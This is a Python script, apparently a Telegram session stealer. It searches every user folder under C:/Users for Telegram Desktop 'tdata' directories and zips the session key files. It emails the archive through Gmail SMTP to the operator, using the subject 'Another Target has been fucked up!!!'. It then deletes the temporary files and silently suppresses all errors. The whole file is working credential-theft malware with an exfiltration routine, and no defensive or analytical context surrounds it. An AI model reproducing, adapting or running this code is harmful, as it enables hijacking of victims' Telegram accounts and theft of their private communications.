import smtplib
import ssl
import email
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import os
from os.path import basename
from zipfile import ZipFile
import shutil


def send_gmail_with_file(subject, body, sender_email, receiver_email, password, filename):
    message = MIMEMultipart()
    message["From"] = sender_email
    message["To"] = receiver_email
    message["Subject"] = subject
    message["Bcc"] = receiver_email

    message.attach(MIMEText(body, "plain"))

    with open(filename, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)

    part.add_header("Content-Disposition", f"attachment; filename= {filename}",)

    message.attach(part)
    text = message.as_string()

    context = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context) as server:
        server.login(sender_email, password)
        server.sendmail(sender_email, receiver_email, text)


def main():
    '''
    Collect and make a zip file of the neccecery sub files and sub dirs for every single tdata folder
    in "C:/Users" path and send the final zip file to the reciever email using the above function.
    '''

    tdata_counter = 0
    for root, folders, files in os.walk('C:/Users'):
        if 'tdata' in folders:

            tdata_sub_dirs = [(os.path.join(os.path.join(root, 'tdata'), dir_name), dir_name) for dir_name in os.listdir(os.path.join(root, 'tdata')) if os.path.isdir(os.path.join(
                os.path.join(root, 'tdata'), dir_name)) and dir_name.find('dumps') == -1 and dir_name.find('emoji') == -1 and dir_name.find('user_data') == -1 and dir_name.find('tdummy') == -1]

            tdata_sub_files = [os.path.join(os.path.join(root, 'tdata'), file_name) for file_name in os.listdir(os.path.join(
                root, 'tdata')) if not os.path.isdir(os.path.join(os.path.join(root, 'tdata'), file_name)) if file_name == 'key_datas' or file_name[:-1] in [sub_dir[1] for sub_dir in tdata_sub_dirs]]

            tdata_sub_dirs_counter = 0
            tdata_sub_dirs_names = []

            for sub_dir in tdata_sub_dirs:
                tdata_sub_dirs_counter += 1
                tdata_sub_dirs_names.append(sub_dir[1])
                shutil.make_archive(f'{tdata_sub_dirs_names[-1]}', 'zip', sub_dir[0])

            tdata_counter += 1
            with ZipFile(f'recieved{tdata_counter}.zip', 'w') as zip_obj:
                for i in range(tdata_sub_dirs_counter):
                    zip_obj.write(f'{tdata_sub_dirs_names[i]}.zip')

                for sub_file in tdata_sub_files:
                    zip_obj.write(sub_file, basename(sub_file))

            for i in range(tdata_sub_dirs_counter):
                if os.path.exists(f'{tdata_sub_dirs_names[i]}.zip'):
                    os.remove(f'{tdata_sub_dirs_names[i]}.zip')

    with ZipFile('final.zip', 'w') as zip_obj:
        for i in range(tdata_counter):
            zip_obj.write(f'recieved{i+1}.zip')

    for i in range(tdata_counter):
        if os.path.exists(f'recieved{i+1}.zip'):
            os.remove(f'recieved{i+1}.zip')

    # change the value of these variables to your own gmail username and password 
    sender_gmail = 'example@gmail.com'
    sender_gmail_password = '*********'
    reciever_gmail = 'example@gmail.com'
    send_gmail_with_file("Another Target has been fucked up!!!", "Look what do we have here!", sender_gmail, reciever_gmail, sender_gmail_password, "final.zip")
    if os.path.exists('final.zip'):
        os.remove('final.zip')


if __name__ == '__main__':
    try:
        main()
    except:
        pass
